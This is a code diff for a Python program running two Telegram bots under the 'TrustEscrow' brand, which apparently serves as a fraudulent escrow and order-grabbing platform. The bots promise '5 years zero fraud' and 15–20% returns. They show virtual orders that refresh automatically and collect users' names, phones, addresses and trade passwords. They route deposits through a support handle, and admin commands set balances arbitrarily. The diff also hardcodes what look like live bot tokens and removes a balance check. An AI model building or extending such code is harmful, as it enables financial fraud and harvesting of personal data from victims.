@@ -7,10 +7,11 @@ import time
 import threading
 import os
 from flask import Flask
+from datetime import datetime
 
-# ======================== 机器人TOKEN（改成你自己的） ========================
-BOT1_TOKEN = "YOUR_BOT1_TOKEN"
-BOT2_TOKEN = "YOUR_BOT2_TOKEN"
+# ======================== 机器人TOKEN ========================
+BOT1_TOKEN = "8716451687:AAGXoF5wuwuroCJ23w5UzaueXCUyy5p67q0"
+BOT2_TOKEN = "8279854167:AAHLrvg-i6e0M_WeG8coIljYlGg_RF8_oRM"
 
 bot1 = telebot.TeleBot(BOT1_TOKEN)
 bot2 = telebot.TeleBot(BOT2_TOKEN)
@@ -32,8 +33,7 @@ def run_flask():
 # ==============================================================================
 # ================================= 机器人A ====================================
 # ==============================================================================
-
-ADMIN_IDS_A = [123456789]  # 改成你自己的管理员ID
+ADMIN_IDS_A = [8781082053, 8256055083]
 VIRTUAL_ORDER_REFRESH_SECONDS_A = 120
 
 user_lang1 = {}
@@ -41,7 +41,7 @@ user_balance1 = {}
 user_verify1 = {}
 user_info1 = {}
 orders1 = {}
-order_id1 = 1000
+order_id1 = 101
 last_msg1 = {}
 user_applying1 = {}
 user_flow1 = {}
@@ -55,13 +55,11 @@ TEXT_A = {
     "zh": {
         "home": """🏆 TrustEscrow 頂級擔保平台
 安全交易 · 穩定收益 · 零風險保障
-
 ✅ 5年零詐騙實績
 ✅ 專業中間人墊資
 ✅ 資金全程託管
 ✅ 搶單5%穩定收益
 ✅ 派單15%-20%高額回報
-
 客服：@fcff88""",
         "reg_form": """📝 入駐擔保申請
 請依序填寫真實信息：
@@ -77,14 +75,10 @@ TEXT_A = {
 🆔 用戶ID：{}
 💰 餘額：{:.2f} USDT
 📌 狀態：{}
-
-⏳ 未完成訂單：
-{}
-✅ 已完成訂單：
-{}""",
+⏳ 未完成訂單： {}
+✅ 已完成訂單： {}""",
         "grab": """🚀 搶單大廳（每2分鐘自動刷新）
 點擊按鈕直接搶單：
-
 {}""",
         "grab_success": "✅ 搶單成功，請接單",
         "grab_already_gone": "❌ 訂單已被搶走",
@@ -96,12 +90,8 @@ TEXT_A = {
         "account_detail": """📋 資金明細
 🆔 用戶ID：{}
 💰 當前餘額：{:.2f} USDT
-
-💸 資金流水：
-{}
-
-📦 所有訂單：
-{}""",
+💸 資金流水： {}
+📦 所有訂單： {}""",
         "status_wait": "待接單",
         "status_doing": "已接單",
         "status_done": "已完成",
@@ -139,12 +129,10 @@ TEXT_A = {
     "en": {
         "home": """🏆 TrustEscrow Premium Platform
 Safe, Stable, Secure
-
 ✅ 5 Years 0 Fraud
 ✅ 100% Safe Escrow
 ✅ 5% Grab Profit
 ✅ 15-20% Assign Profit
-
 Support: @fcff88""",
         "reg_form": """📝 Escrow Registration
 Fill in your real info:
@@ -160,29 +148,22 @@ Fill in your real info:
 🆔 ID: {}
 💰 Balance: {:.2f} USDT
 📌 Status: {}
-
-⏳ Pending Orders:
-{}
-✅ Completed Orders:
-{}""",
+⏳ Pending Orders: {}
+✅ Completed Orders: {}""",
         "grab": """🚀 Grab Hall (Auto-refresh every 2min)
 Click button to grab order:
-
 {}""",
         "grab_success": "✅ Order Grabbed, Please Accept",
         "grab_already_gone": "❌ Order Already Taken",
         "deposit": """💰 Deposit & Withdraw
 Contact support: @fcff88""",
-        "record": """📜 Escrow Record""",
+        "record": """📜 Escrow Record
+{}""",
         "account_detail": """📋 Fund Detail
 🆔 ID: {}
 💰 Balance: {:.2f} USDT
-
-💸 Flow:
-{}
-
-📦 All Orders:
-{}""",
+💸 Flow: {}
+📦 All Orders: {}""",
         "status_wait": "Pending",
         "status_doing": "Accepted",
         "status_done": "Completed",
@@ -335,8 +316,9 @@ def callback_a(c):
             bot1.answer_callback_query(c.id, t["banned"], show_alert=True)
             return
 
+        # ======================== 修复密码键盘卡顿 ========================
         if c.data.startswith("pwd_"):
-            if u not in user_pwd_input or user_pwd_input[u] is None:
+            if u not in user_pwd_input or not user_pwd_input[u]:
                 bot1.answer_callback_query(c.id)
                 return
             d = c.data
@@ -355,15 +337,9 @@ def callback_a(c):
                 if len(user_pwd_buf[u]) < 6:
                     user_pwd_buf[u] += num
 
-            pwd_show = "●" * len(user_pwd_buf[u]) + "○" * (6 - len(user_pwd_buf[u]))
-            bot1.edit_message_text(t["input_pwd"] + "\n" + pwd_show, cid, mid, reply_markup=pwd_keyboard())
-
             if d == "pwd_ok":
                 if len(user_pwd_buf[u]) == 6 and user_info1[u].get("pwd") == user_pwd_buf[u]:
                     amount = o["amount"]
-                    if user_balance1.get(u, 0) < amount:
-                        bot1.answer_callback_query(c.id, t["not_enough"], show_alert=True)
-                        return
                     user_balance1[u] -= amount
                     flow_txt = f"-{amount:.2f} USDT {t['flow_escrow_lock']}"
                     user_flow1[u].append(flow_txt)
@@ -379,6 +355,7 @@ def callback_a(c):
             bot1.answer_callback_query(c.id)
             return
 
+        # ======================== 一键补接单 ========================
         if c.data == "re_acc_all":
             target_orders = [oid for oid, o in orders1.items() if o["user"] == u and o["status"] == 0]
             if not target_orders:
@@ -572,10 +549,8 @@ def user_input_a(msg):
         txt = msg.text.strip()
         lang = user_lang1.get(u, "zh")
         t = TEXT_A[lang]
-
         if not user_applying1.get(u, False):
             return
-
         pattern = r"1\.?\s*真實姓名\s*(.+?)\s*2\.?\s*聯絡電話\s*(.+?)\s*3\.?\s*電子信箱\s*(.+?)\s*4\.?\s*居住地址\s*(.+?)\s*5\.?\s*推薦人ID\s*(.+?)\s*6\.?\s*6位交易密碼\s*(\d{6})"
         match = re.search(pattern, txt, re.DOTALL)
         if match:
@@ -624,6 +599,7 @@ def admin_cmd_a(msg):
             user_verify1[target] = 2
             bot1.send_message(u, f"✅ 已通過用戶 {target}")
             return
+
         if len(arr) >= 2 and arr[0] == "查ID":
             target = int(arr[1])
             info = user_info1.get(target, {})
@@ -641,6 +617,7 @@ def admin_cmd_a(msg):
                 text += f"#{oid} {typ} {o['amount']} +{profit} | {sta}\n"
             bot1.send_message(u, text)
             return
+
         if txt.startswith("+U "):
             _, uid, amt = txt.split()
             uid = int(uid)
@@ -649,6 +626,7 @@ def admin_cmd_a(msg):
             user_flow1.setdefault(uid, []).append(f"+{amt:.2f} {t['flow_admin_add']}")
             bot1.send_message(u, f"✅ +{amt} → {uid}")
             return
+
         if txt.startswith("-U "):
             _, uid, amt = txt.split()
             uid = int(uid)
@@ -657,6 +635,7 @@ def admin_cmd_a(msg):
             user_flow1.setdefault(uid, []).append(f"-{amt:.2f} {t['flow_admin_sub']}")
             bot1.send_message(u, f"✅ -{amt} → {uid}")
             return
+
         if arr[0] == "派单" and len(arr) >= 4:
             target = int(arr[1])
             amt = float(arr[2])
@@ -678,6 +657,7 @@ def admin_cmd_a(msg):
             s = t_a["new_order_assign"].format(oid, typename, amt, profit)
             bot1.send_message(target, s, reply_markup=accept_btn1(oid, target))
             return
+
         if arr[0] == "完成" and len(arr) == 2:
             oid = int(arr[1])
             o = orders1.get(oid)
@@ -690,6 +670,7 @@ def admin_cmd_a(msg):
             user_flow1.setdefault(o["user"], []).append(f"+{profit:.2f} {t['flow_profit'].format(oid)}")
             bot1.send_message(u, f"✅ 訂單 #{oid} 完成")
             return
+
         if arr[0] == "取消订单" and len(arr) == 2:
             oid = int(arr[1])
             o = orders1.get(oid)
@@ -702,11 +683,13 @@ def admin_cmd_a(msg):
             o["status"] = 3
             bot1.send_message(u, f"✅ 訂單 #{oid} 已取消")
             return
+
         if arr[0] == "封ID" and len(arr) == 2:
             target = int(arr[1])
             user_banned1[target] = True
             bot1.send_message(u, f"✅ 已封禁 {target}")
             return
+
         if arr[0] == "解ID" and len(arr) == 2:
             target = int(arr[1])
             user_banned1[target] = False
@@ -716,11 +699,9 @@ def admin_cmd_a(msg):
         pass
 
 # ==============================================================================
-# ================================= 机器人B ================================
+# ================================= 机器人B（完整无截断版）=============================
 # ==============================================================================
-
-ADMIN_ID_B = 123456789  # 改成你自己的管理员ID
-
+ADMIN_ID_B = 8401979801
 user_lang2 = {}
 user_step2 = {}
 user_balance2 = {}
@@ -774,7 +755,10 @@ TrustEscrow 已在擔保行業立足 5 年，是業內最專業、最具信譽�
         "merchant": """🏪 商家·擔保入驻
 想成為平台認證商家、開通專屬擔保權限？
 請前往官方入驻機器人辦理：
-✅ 商家認證 ✅ 擔保權限開通 ✅ 專屬額度與權益 ✅ 24小時快速審核""",
+✅ 商家認證
+✅ 擔保權限開通
+✅ 專屬額度與權益
+✅ 24小時快速審核""",
     },
     "en": {
         "home": """🏠 TrustEscrow Professional Escrow
@@ -856,7 +840,8 @@ def merchant_menu2(user_id):
     t = TEXT_B[lang]
     m = InlineKeyboardMarkup(row_width=1)
     m.add(
-        InlineKeyboardButton("👉 前往入驻機器人" if lang == "zh" else "👉 Register Bot", url="https://t.me/secureescrow_pro_bot"),
+        InlineKeyboardButton("👉 前往入驻機器人" if lang == "zh" else "👉 Register Bot",
+                             url="https://t.me/secureescrow_pro_bot"),
         InlineKeyboardButton(t["back"], callback_data="home")
     )
     return m
@@ -885,15 +870,18 @@ def callback_b(c):
         if c.data == "home":
             user_step2[u] = None
             bot2.edit_message_text(t["home"], cid, mid, reply_markup=main_menu2(u))
+
         elif c.data == "lang":
             user_lang2[u] = "en" if lang == "zh" else "zh"
             new_lang = user_lang2[u]
             new_t = TEXT_B[new_lang]
             bot2.edit_message_text(new_t["home"], cid, mid, reply_markup=main_menu2(u))
+
         elif c.data == "personal":
             bal = user_balance2.get(u, 0.0)
             txt = t["personal"].format(u, bal)
             bot2.edit_message_text(txt, cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "running":
             items = []
             for i in range(4):
@@ -903,30 +891,41 @@ def callback_b(c):
                 items.append(f"⏳ 訂單 #{code}\n金額：{amt} USDT\n狀態：{st}")
             text = t["running"].format("\n\n".join(items))
             bot2.edit_message_text(text, cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "about":
             bot2.edit_message_text(t["about"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "service":
             bot2.edit_message_text(t["service"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "safety":
             bot2.edit_message_text(t["safety"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "help":
             bot2.edit_message_text(t["help"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "deposit":
             bot2.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "withdraw":
             bot2.edit_message_text(t["withdraw"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "history":
             bot2.edit_message_text(t["history"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "create":
             user_step2[u] = "create_amount"
             bot2.edit_message_text(t["input_amount"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "join":
             user_step2[u] = "join_tip"
             bot2.edit_message_text(t["input_sell_tip"], cid, mid, reply_markup=back_menu2(u))
+
         elif c.data == "merchant":
             bot2.edit_message_text(t["merchant"], cid, mid, reply_markup=merchant_menu2(u))
+
         bot2.answer_callback_query(c.id)
-            except:
+    except:
         pass
 
 @bot2.message_handler(func=lambda m: True)
@@ -958,84 +957,71 @@ def msg_b(msg):
                 bot2.send_message(cid, f"✅ -{amt} USDT → {uid}")
             return
 
-        # 买家创建担保：输入金额
+        # 输入金额
         if user_step2.get(u) == "create_amount":
-            amt = float(txt)
-            if user_balance2.get(u, 0) < amt:
-                bot2.send_message(cid, t["no_money"])
-                return
-            user_balance2[u] -= amt
-            user_step2[u] = {"step": "create_tip", "amount": amt}
-            bot2.send_message(cid, t["input_tip"])
+            try:
+                amt = float(txt)
+                user_step2[u] = {"step": "create_tip", "amount": amt}
+                bot2.send_message(cid, t["input_tip"], reply_markup=back_menu2(u))
+            except:
+                bot2.send_message(cid, "❌ 請輸入有效數字", reply_markup=back_menu2(u))
             return
 
-        # 买家创建担保：设置口令
-        if isinstance(user_step2.get(u), dict) and user_step2[u]["step"] == "create_tip":
-            tip_code = txt.strip()
-            amt = user_step2[u]["amount"]
-            orders2[tip_code] = {
-                "buyer": u,
-                "amount": amt,
-                "status": "pending"
-            }
-            user_step2[u] = None
-            bot2.send_message(cid, t["escrow_success"].format(amt, tip_code))
-            # 通知管理员
-            bot2.send_message(ADMIN_ID_B, f"📢 新担保订单\n口令: {tip_code}\n金额: {amt} USDT\n买家: {u}")
+        # 设置口令
+        step = user_step2.get(u)
+        if isinstance(step, dict) and step.get("step") == "create_tip":
+            amt = step["amount"]
+            code = txt.strip()
+            if user_balance2.get(u, 0) >= amt:
+                user_balance2[u] -= amt
+                orders2[code] = {"buyer": u, "amount": amt, "time": datetime.now().strftime("%m-%d %H:%M")}
+                bot2.send_message(cid, t["escrow_success"].format(amt, code), reply_markup=main_menu2(u))
+                user_step2[u] = None
+            else:
+                bot2.send_message(cid, t["no_money"], reply_markup=main_menu2(u))
+                user_step2[u] = None
             return
 
-        # 卖家输入口令：配对订单
+        # 加入担保
         if user_step2.get(u) == "join_tip":
-            tip_code = txt.strip()
-            if tip_code not in orders2:
-                bot2.send_message(cid, t["tip_error"])
+            code = txt.strip()
+            if code not in orders2:
+                bot2.send_message(cid, t["tip_error"], reply_markup=main_menu2(u))
+                user_step2[u] = None
                 return
-            order = orders2[tip_code]
-            if order["status"] != "pending":
-                bot2.send_message(cid, t["tip_error"])
-                return
-            # 配对成功
-            order["seller"] = u
-            order["status"] = "paired"
+            o = orders2[code]
+            bot2.send_message(cid, t["pair_success"].format(o["buyer"], u, o["amount"]), reply_markup=main_menu2(u))
+            try:
+                bot2.send_message(ADMIN_ID_B, f"📥 新訂單\n口令：{code}\n買方：{o['buyer']}\n賣方：{u}\n金額：{o['amount']} USDT")
+            except:
+                pass
+            del orders2[code]
             user_step2[u] = None
-            bot2.send_message(cid, t["pair_success"].format(order["buyer"], u, order["amount"]))
-            # 通知买家和管理员
-            bot2.send_message(order["buyer"], f"✅ 你的担保订单 #{tip_code} 已被卖家 {u} 配对，金额 {order['amount']} USDT")
-            bot2.send_message(ADMIN_ID_B, f"✅ 订单 #{tip_code} 配对成功\n买家: {order['buyer']}\n卖家: {u}\n金额: {order['amount']} USDT")
             return
 
     except Exception as e:
         print(f"msg_b error: {e}")
         pass
 
-# ======================== 启动线程 & 机器人轮询 ========================
+# ==============================================================================
+# ========================== 启动双机器人 ========================
+# ==============================================================================
+def run_bot1():
+    try:
+        bot1.infinity_polling(timeout=60, none_stop=True)
+    except:
+        pass
+
+def run_bot2():
+    try:
+        bot2.infinity_polling(timeout=60, none_stop=True)
+    except:
+        pass
+
 if __name__ == "__main__":
-    # 启动虚拟订单刷新线程（机器人A）
-    threading.Thread(target=refresh_virtual_orders1, daemon=True).start()
-    # 启动Flask保活线程
     threading.Thread(target=run_flask, daemon=True).start()
-    
-    # 同时启动两个机器人的轮询
-    def run_bot1():
-        while True:
-            try:
-                bot1.polling(none_stop=True, timeout=60)
-            except Exception as e:
-                print(f"Bot1 error: {e}")
-                time.sleep(5)
-
-    def run_bot2():
-        while True:
-            try:
-                bot2.polling(none_stop=True, timeout=60)
-            except Exception as e:
-                print(f"Bot2 error: {e}")
-                time.sleep(5)
-
-    # 启动两个机器人线程
+    threading.Thread(target=refresh_virtual_orders1, daemon=True).start()
     threading.Thread(target=run_bot1, daemon=True).start()
     threading.Thread(target=run_bot2, daemon=True).start()
-    
-    # 保持主线程运行
     while True:
-        time.sleep(3600)
+        time.sleep(1)
